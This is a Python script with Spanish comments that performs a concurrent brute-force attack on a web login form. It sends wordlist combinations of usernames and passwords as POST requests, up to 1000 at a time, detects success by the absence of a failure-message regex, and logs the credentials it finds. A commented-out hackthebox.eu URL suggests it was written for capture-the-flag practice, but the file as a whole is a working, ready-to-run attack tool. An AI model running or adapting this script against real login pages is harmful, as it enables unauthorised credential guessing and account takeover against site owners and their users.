#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import argparse
import asyncio
import json
import logging
import re
import sys
from http import HTTPStatus
from pathlib import Path
from typing import Dict
from typing import List

import requests
from aiohttp import ClientSession, ClientResponse

from logger import logger

REQ_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
}


def check_regex_response(response: str, regex: str) -> bool:
    """
    Metodo para comprobar si la respuesta contiene el texto esperado, que sera el que conocemos (el de contraseña
    invalida)
    :param response:
    :param regex:
    :return:
    """
    if not re.search(regex, response, re.IGNORECASE):
        logger.debug("EXITO")
        return True
    return False


async def fetch(session: ClientSession, url: str, username: str, password: str, my_json: Dict):
    logger.debug(f'Trying: user: "{username}", pass: "{password}"')
    response: ClientResponse
    async with session.post(url, data=my_json) as response:
        return await response.read(), response


async def bound_fetch(sem: asyncio.locks.Semaphore, session: ClientSession, args: argparse, username: str,
                      password: str, my_json_str: str, total_size: int, cont):
    # Getter function with semaphore.
    my_json = json.loads(my_json_str)
    async with sem:
        text: bytes
        response: ClientResponse
        text, response = await fetch(session, args.target, username, password, my_json)
        if response.status == HTTPStatus.OK:
            valid: bool = check_regex_response(str(text), args.regex)
            if valid:
                logger.warning(f'Trying {cont}/{total_size}: user: "{username}", pass: "{password}" -> Success')
                p: Path = Path('bruteforce_post_async.log')
                with open(str(p), 'a') as f:
                    f.write(f'Trying: user: "{username}", pass: "{password}" -> Success\n')
                sys.exit(0)
            else:
                logger.info(f'Trying {cont}/{total_size}: user: "{username}", pass: "{password}" -> Fail')
        else:
            logger.error(response)
            logger.error(text)


def is_online(url):
    try:
        requests.models.Response = requests.get(url)
    except requests.exceptions.ConnectionError as e:
        logger.critical(f'Error in target: {e}')
        sys.exit(1)


async def run(args: argparse):
    # url = args.target # 'http://docker.hackthebox.eu:31222/'
    # regex = args.regex # 'Invalid password!'
    name_username: str
    name_password: str
    my_json: Dict[str, str] = json.loads(args.json)
    keys_json = list(my_json)

    # si el json tiene 1 valor se entiende que es la pass, si tiene 2 hay user y pass
    if len(keys_json) >= 2:
        name_username = keys_json[0]
        name_password = keys_json[1]
    elif len(keys_json) == 1:
        name_username = ''
        name_password = keys_json[0]
    else:
        logger.critical('json is not valid')
        sys.exit(1)

    if args.verbose:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)

    dict_users: List = list()
    dict_passwords: List = list()

    # creamos un diccionaro de users
    if args.Login is None:
        dict_users.append(args.login)
    else:
        file_username: Path = Path(args.Login)
        if file_username.exists():
            dict_users = file_username.read_text().split('\n')
            dict_users.remove('')  # eliminar lineas en blanco
        else:
            logger.critical(f'File "{args.Login}" not exits')
            sys.exit(1)

    # creamos un diccionaro de passwords
    if args.Password is None:
        dict_passwords.append(args.password)
    else:
        file_password: Path = Path(args.Password)
        if file_password.exists():
            dict_passwords = file_password.read_text().split('\n')
        else:
            logger.critical(f'File "{args.Password}" not exits')
            sys.exit(1)

    is_online(args.target)

    #print('users: ', dict_users)
    #print('passwords: ', dict_passwords)

    len_user = len(dict_users)
    len_pwd = len(dict_passwords)

    user: str
    pwd: str
    cont: int = 1

    tasks: List = list()
    # create instance of Semaphore
    sem: asyncio.locks.Semaphore = asyncio.Semaphore(1000)

    # Create client session that will ensure we dont open new connection per each request.
    async with ClientSession() as session:
        for user in dict_users:
            # if len(user) == 0:  # si existe alguna liena en blanco la omitimos, ya se hace al crear la lista
            #    continue
            # Actualizamos el username si es necesario ponerlo, ya se hace al crear la lista
            if name_username in my_json.keys():
                my_json[name_username] = user

            for pwd in dict_passwords:
                # Actualizamos la contraseña
                if name_password in my_json.keys():
                    my_json[name_password] = pwd

                # pass Semaphore and session to every GET request
                update_json = json.dumps(my_json)  # si envio el json como dict llega vacio a la funcion (i dont known)
                task = asyncio.ensure_future(
                    bound_fetch(sem, session, args, user, pwd, update_json, (len_user * len_pwd), cont))
                tasks.append(task)
                cont += 1

        responses = asyncio.gather(*tasks)
        await responses


def create_arg_parser() -> argparse:
    """
    Metodo para establecer los argumentos que necesita la clasek
    :return:
    """
    example = "python3 %(prog)s -ip 127.0.0.1"

    my_parser = argparse.ArgumentParser(description='%(prog)s a is a script for attack bruteforce post',
                                        usage='{}'.format(example))

    requiered = my_parser.add_argument_group('requiered arguments')
    requiered.add_argument('target', help='target.')
    requiered.add_argument('regex', help='regex.')
    # requiered.add_argument('-u', '--url', help='target.')
    # requiered.add_argument('-r', '--regex', help='regex.')

    my_parser.add_argument('-j', '--json', help='Scan advanced (boolean).', default='{"username":"","password":""}')
    my_parser.add_argument('-l', '--login', help='Scan advanced (boolean).', default='root')
    my_parser.add_argument('-L', '--Login', help='Scan advanced (boolean).')
    my_parser.add_argument('-p', '--password', help='Scan advanced (boolean).', default='admin')
    my_parser.add_argument('-P', '--Password', help='Scan advanced (boolean).')
    # my_parser.add_argument('-a', '--advanced', action='store_true', help='Scan advanced (boolean).', default=False)
    my_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose flag (boolean).', default=False)

    if len(sys.argv) == 1:
        my_parser.print_help()
        sys.exit(1)
    return my_parser.parse_args()


if __name__ == '__main__':
    arg: argparse = create_arg_parser()

    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(run(arg))
    loop.run_until_complete(future)
